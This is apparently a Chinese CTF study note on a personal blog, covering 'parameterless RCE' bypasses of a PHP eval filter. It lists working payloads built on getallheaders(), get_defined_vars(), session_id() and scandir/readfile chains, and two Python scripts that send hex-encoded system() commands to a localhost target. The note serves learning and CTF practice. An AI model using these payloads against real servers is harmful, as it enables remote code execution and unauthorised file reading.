@@ -1,0 +1,370 @@
+<!DOCTYPE html><html class="hide-aside" lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>无参rce | Kanyun's Blog</title><meta name="keywords" content="CTF_WEB"><meta name="author" content="kanyun"><meta name="copyright" content="kanyun"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="RCE总结 概念介绍： RCE英文全称：remote command&#x2F;code execute分为远程命令执行ping和远程代码执行evel。  漏洞出现的原因：没有在输入口做输入处理。我们常见的路由器、防火墙、入侵检测等设备的web管理界面上  一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。其实这就是一">
+<meta property="og:type" content="article">
+<meta property="og:title" content="无参rce">
+<meta property="og:url" content="https://kannikanyun.github.io/2022/06/24/%E6%97%A0%E5%8F%82rce/index.html">
+<meta property="og:site_name" content="Kanyun&#39;s Blog">
+<meta property="og:description" content="RCE总结 概念介绍： RCE英文全称：remote command&#x2F;code execute分为远程命令执行ping和远程代码执行evel。  漏洞出现的原因：没有在输入口做输入处理。我们常见的路由器、防火墙、入侵检测等设备的web管理界面上  一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。其实这就是一">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031731505.jpg">
+<meta property="article:published_time" content="2022-06-24T10:49:11.000Z">
+<meta property="article:modified_time" content="2022-06-24T13:58:12.841Z">
+<meta property="article:author" content="kanyun">
+<meta property="article:tag" content="CTF_WEB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031731505.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://kannikanyun.github.io/2022/06/24/%E6%97%A0%E5%8F%82rce/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"top-right"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '无参rce',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-06-24 21:58:12'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/myWordCss.css"><link rel="stylesheet" href="/css/mycss.css"><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="Kanyun's Blog" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206131634016.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/diary/"><i class="fa-fw fas fa-diary"></i><span> 笔记</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031731505.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Kanyun's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/diary/"><i class="fa-fw fas fa-diary"></i><span> 笔记</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">无参rce</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-06-24T10:49:11.000Z" title="发表于 2022-06-24 18:49:11">2022-06-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-06-24T13:58:12.841Z" title="更新于 2022-06-24 21:58:12">2022-06-24</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">779</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>2分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="无参rce"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46706771/article/details/119008895">RCE总结</a></p>
+<h2 id="概念介绍："><a href="#概念介绍：" class="headerlink" title="概念介绍："></a>概念介绍：</h2><blockquote>
+<p>RCE英文全称：remote command/code execute<br>分为远程命令执行ping和远程代码执行evel。</p>
+<blockquote>
+<p>漏洞出现的原因：没有在输入口做输入处理。<br>我们常见的路由器、防火墙、入侵检测等设备的web管理界面上</p>
+<blockquote>
+<p>一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。其实这就是一个接口，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是RCE漏洞。</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p><u>所谓无参数RCE，就是通过<strong>没有参数的函数达到命令执行的目的</strong></u></p>
+<p>即</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    
+    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">preg_replace</span> <span class="token punctuation">(</span> 搜索的模式<span class="token punctuation">,</span>用于替换的字符串或字符串数组<span class="token punctuation">,</span>要搜索替换的 <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><a target="_blank" rel="noopener" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">无参rce详细解释</a></p>
+<p>常用方法：</p>
+<h2 id="1-getenv"><a href="#1-getenv" class="headerlink" title="1.getenv()"></a>1.getenv()</h2><p>获取一个环境变量值</p>
+<blockquote>
+<p><code>$GLOBALS</code><br><code>$_SERVER $_GET</code><br><code>$_POST $_FILES</code><br><code>$_COOKIE $_SESSION</code><br><code>$_REQUEST $_ENV</code></p>
+</blockquote>
+<h4 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h4><blockquote>
+<p>array_rand(array_flip($a))</p>
+<ol>
+<li>array_rand():随机从数组中返回键</li>
+<li>array_flip():交换数组中键和值</li>
+</ol>
+</blockquote>
+<h2 id="2-getallheaders"><a href="#2-getallheaders" class="headerlink" title="2.getallheaders()"></a>2.getallheaders()</h2><p><em><u>getallheaders()其实具有局限性，因为他是apache的函数，如果目标中间件不为apache，那么这种方法就会失效</u></em></p>
+<p>可以进一步利用http header的sky属性进行rce</p>
+<blockquote>
+<blockquote>
+<p>var_dump(getallheaders()); //直接页面回显</p>
+</blockquote>
+<blockquote>
+<p>sky: phpinfo();</p>
+</blockquote>
+</blockquote>
+<blockquote>
+<p>sky：system(‘ls /tmp’);</p>
+<p>或：</p>
+<p>sky：phpinfo();</p>
+</blockquote>
+<h2 id="3-get-defined-vars"><a href="#3-get-defined-vars" class="headerlink" title="3.get_defined_vars()"></a>3.get_defined_vars()</h2><p>如果目标中间件不为apache，可以使用get_defined_vars()，显全局变量<code>_GET $_POST $_FILES $_COOKIE</code></p>
+<p>get_defined_vars():<code>返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量</code></p>
+<p>payload：</p>
+<p><code>code=var_dump(current(get_defined_vars()));&amp;sky=phpinfo();</code></p>
+<p>如果网站对一下进行全局过滤</p>
+<pre class="line-numbers language-none"><code class="language-none">$_GET
+$_POST
+$_COOKIE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>最终脚本如下</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO
+
+payload <span class="token operator">=</span> <span class="token string">"system('ls /tmp');"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>
+files <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+  payload<span class="token punctuation">:</span> BytesIO<span class="token punctuation">(</span><span class="token string">'sky cool!'</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span>
+
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://localhost/skyskysky.php?code=eval(hex2bin(array_rand(end(get_defined_vars()))));'</span><span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+
+<span class="token keyword">print</span> r<span class="token punctuation">.</span>content<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h1 id="4-session-id"><a href="#4-session-id" class="headerlink" title="4.session_id()"></a>4.session_id()</h1><p>则，hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符</p>
+<pre class="line-numbers language-none"><code class="language-none">import requests
+url &#x3D; &#39;http:&#x2F;&#x2F;localhost&#x2F;?code&#x3D;eval(hex2bin(session_id(session_start())));&#39;
+payload &#x3D; &quot;echo &#39;sky cool&#39;;&quot;.encode(&#39;hex&#39;)
+cookies &#x3D; &#123;
+	&#39;PHPSESSID&#39;:payload
+&#125;
+r &#x3D; requests.get(url&#x3D;url,cookies&#x3D;cookies)
+print r.content<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h1 id="5-dirname-amp-chdir"><a href="#5-dirname-amp-chdir" class="headerlink" title="5.dirname() &amp; chdir()"></a>5.dirname() &amp; chdir()</h1><h3 id="poyload"><a href="#poyload" class="headerlink" title="poyload:"></a>poyload:</h3><pre class="line-numbers language-none"><code class="language-none">readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<ol>
+<li><code>getcwd()</code>获取当前目录</li>
+<li>dirname()目录上跳:—返回父目录的路径</li>
+<li>chdir (字符串 <code>$directory</code>): bool     将 PHP 的当前目录更改为 <code>directory</code>.</li>
+<li>scandir()文件、目录遍历</li>
+<li>array_reverse() 函数返回翻转顺序的数组</li>
+<li>readfile() 函数读取一个文件，并写入到输出缓冲</li>
+<li>next()函数将内部指针指向数组中的下一个元素，并输出</li>
+<li><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-array-prev.html">prev()</a> - 将内部指针指向数组中的上一个元素，并输出</li>
+<li><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-array-current.html">current()</a> - 返回数组中的当前元素的值</li>
+<li><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-array-end.html">end()</a> - 将内部指针指向数组中的最后一个元素，并输出</li>
+<li><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-array-reset.html">reset()</a> - 将内部指针指向数组中的第一个元素，并输出</li>
+<li><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-array-each.html">each()</a> - 返回当前元素的键名和键值，并将内部指针向前移动</li>
+</ol>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">kanyun</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://kannikanyun.github.io/2022/06/24/%E6%97%A0%E5%8F%82rce/">https://kannikanyun.github.io/2022/06/24/无参rce/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://kannikanyun.github.io" target="_blank">Kanyun's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF-WEB/">CTF_WEB</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031731505.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://s2.loli.net/2022/01/26/yx6wog4V9tDNiUz.jpg" target="_blank"><img class="post-qr-code-img" src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206131636877.jpg" alt="WeChat"/></a><div class="post-qr-code-desc">WeChat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/06/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/"><img class="prev-cover" src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031731042.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">文件上传&amp;条件竞争</div></div></a></div><div class="next-post pull-right"><a href="/2022/06/17/public/workbox-e28eeb62/"><img class="next-cover" src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031730606.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info"></div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/05/12/BUU-Web-page1/" title=""><img class="cover" src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031730201.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-05-12</div><div class="title"></div></div></a></div><div><a href="/2022/03/24/CtfhubDay1/" title="CtfhubDay1"><img class="cover" src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031730606.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-24</div><div class="title">CtfhubDay1</div></div></a></div><div><a href="/2022/06/14/BUUweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/" title="BUUweb刷题记录2"><img class="cover" src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031730213.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-14</div><div class="title">BUUweb刷题记录2</div></div></a></div><div><a href="/2022/04/14/ctf.show_web9/" title="ctf.show_web9"><img class="cover" src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031731435.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-14</div><div class="title">ctf.show_web9</div></div></a></div><div><a href="/2022/02/18/Xctf--Web--Challenge--area%20Wp/" title="Xctf--Web--Challenge--area Wp"><img class="cover" src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031731435.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-18</div><div class="title">Xctf--Web--Challenge--area Wp</div></div></a></div><div><a href="/2022/04/01/ctfShow-web-4-6/" title="ctfShow-web-4-6"><img class="cover" src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031730201.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-01</div><div class="title">ctfShow-web-4-6</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206131634016.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">kanyun</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1EK411s7qM?from=search&amp;seid=11090646219321326337&amp;spm_id_from=333.337.0.0"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://kannikanyun.github.io/" target="_blank" title="Github"><i class="我的Blog"></i></a><a class="social-icon" href="mailto:1391205637@qq.com" target="_blank" title="Email"><i class="我的邮箱"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="http://www.iceo.com.cn/"><i class="fa fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">这是一个随意的地方haha @</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5%E4%BB%8B%E7%BB%8D%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">概念介绍：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-getenv"><span class="toc-number">2.</span> <span class="toc-text">1.getenv()</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload%EF%BC%9A"><span class="toc-number">2.0.1.</span> <span class="toc-text">payload：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-getallheaders"><span class="toc-number">3.</span> <span class="toc-text">2.getallheaders()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-get-defined-vars"><span class="toc-number">4.</span> <span class="toc-text">3.get_defined_vars()</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-session-id"><span class="toc-number"></span> <span class="toc-text">4.session_id()</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-dirname-amp-chdir"><span class="toc-number"></span> <span class="toc-text">5.dirname() &amp; chdir()</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#poyload"><span class="toc-number">0.1.</span> <span class="toc-text">poyload:</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/06/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/" title="文件上传&amp;条件竞争"><img src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031731042.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="文件上传&amp;条件竞争"/></a><div class="content"><a class="title" href="/2022/06/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/" title="文件上传&amp;条件竞争">文件上传&amp;条件竞争</a><time datetime="2022-06-24T14:02:38.000Z" title="发表于 